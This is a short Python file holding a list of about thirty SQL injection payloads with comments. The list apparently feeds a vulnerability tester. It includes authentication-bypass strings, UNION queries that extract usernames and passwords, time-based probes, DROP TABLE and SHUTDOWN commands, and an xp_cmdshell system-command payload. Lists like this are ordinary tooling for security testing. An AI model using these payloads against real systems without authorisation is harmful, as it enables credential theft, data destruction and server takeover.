sql_payloads = [
    "'",  # Basic quote
    "' OR '1'='1",  # Boolean-based true condition
    "\" OR \"1\"=\"1",  # Boolean-based with double quotes
    "admin' --",  # Comment out part of the query
    "' OR '1'='1' --",  # Basic OR injection with comment
    "' OR '1'='1' /*",  # Another OR-based with block comment
    "' OR 1=1 --",  # More common boolean-based payload
    "' OR 1=1#",
    "admin' #",  # Comment to terminate query
    "' AND 1=1 --",  # AND condition to test for true
    "' AND 1=1#",
    "' AND 1=1/*",
    "' AND 1=1 --",  # Another variant
    "' UNION SELECT NULL, NULL --",  # Union-based SQL injection
    "' UNION SELECT 1,2,3 --",  # Simple UNION to inject data
    "' UNION SELECT null, username, password FROM users --",  # Union-based with database enumeration
    "1' AND 1=0 UNION SELECT null, username, password FROM users --",  # Another Union-based with fake condition
    "'; DROP TABLE users; --",  # Dangerous payload that deletes a table
    "'; SHUTDOWN --",  # Shutdown SQL query payload
    "' OR 1=1; --",  # Another OR-based payload with semicolon
    "admin' -- +",  # Comment and space, another common SQL injection
    "'; EXEC xp_cmdshell('dir') --",  # Payload that tries to run system commands via SQL
    "admin' OR 1=1 --",  # Common payload for bypassing authentication
    "'; EXECUTE IMMEDIATE 'DROP TABLE users' --",  # Attempt to execute destructive SQL
    "admin' UNION SELECT username, password FROM users --",  # Union-based for authentication enumeration
    "' UNION SELECT username, password FROM users WHERE '1'='1' --",  # Specific union to extract user info
    "admin' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",  # Try to exploit specific user existence
    "' AND 1=0 UNION SELECT version() --",  # Get the DB version
    "'; WAITFOR DELAY '0:0:5' --",  # Time-based SQL injection to delay the response and check for vulnerabilities
    "' OR SLEEP(5) --",  # Time-based payload, causes delay if vulnerable
]
